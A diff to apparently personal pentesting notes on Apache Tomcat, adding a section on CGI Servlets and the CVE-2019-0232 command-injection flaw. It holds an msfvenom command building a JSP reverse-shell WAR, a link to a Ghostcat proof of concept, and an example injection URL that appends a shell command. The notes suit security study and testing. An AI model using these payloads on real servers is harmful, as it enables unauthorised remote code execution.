@@ -81,3 +81,22 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f war > backup.w
 [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) affects all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100. [PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).
 
 It relies on the AJP service which is usually on port 8009
+
+## Tomcat CGI
+A CGI Servlet is a middleware program that handles requests from the web browser and forwards them to CGI-compliant scripts that handle the processing for external resources (eg. a database).
+
+**CGI Pros**:
+- Simple and effective for generating dynamic web content
+- Can use any programming language that can read stdin and write to stdout
+- Can reuse existing code and avoid writing new code
+
+**CGI Cons**:
+- Performance hit due to loading programs into memory for each request
+- Cannot easily cache data in memory between page requests
+
+### CVE-2019-0232
+This CVE is a critical RCE for some versions of Tomcat's CGI Servlet. It requires the `enableCmdLineArguments` setting to be enabled in the apache config though.
+
+This causes the CGI Servlet to parse the query string and passes it to the CGI script as arguments. This makes CGI scripts easier to write as it allows passing parameters directly rather than through stdin or env vars.
+
+However on Windows, because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script, this can lead to OS command injection attacks. eg. `http://example.com/cgi-bin/hello.bat?&dir`, this would execute the `dir` command due to the `&` being added.
